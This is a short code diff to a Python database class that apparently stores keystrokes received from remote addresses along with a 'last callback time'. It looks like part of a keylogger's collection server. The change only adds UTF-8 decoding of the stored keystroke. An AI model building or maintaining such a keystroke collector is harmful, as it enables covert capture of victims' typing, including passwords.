@@ -120,7 +120,7 @@ class Database(object):
         # Update the last callback time
         self.cur.execute(qry1, (addr,))
         # Add the keystroke to the database
-        self.cur.execute(qry2, (addr, keystroke))
+        self.cur.execute(qry2, (addr, keystroke.decode('utf-8')))
         # Write the changes to the DB
         self.conn.commit()
 
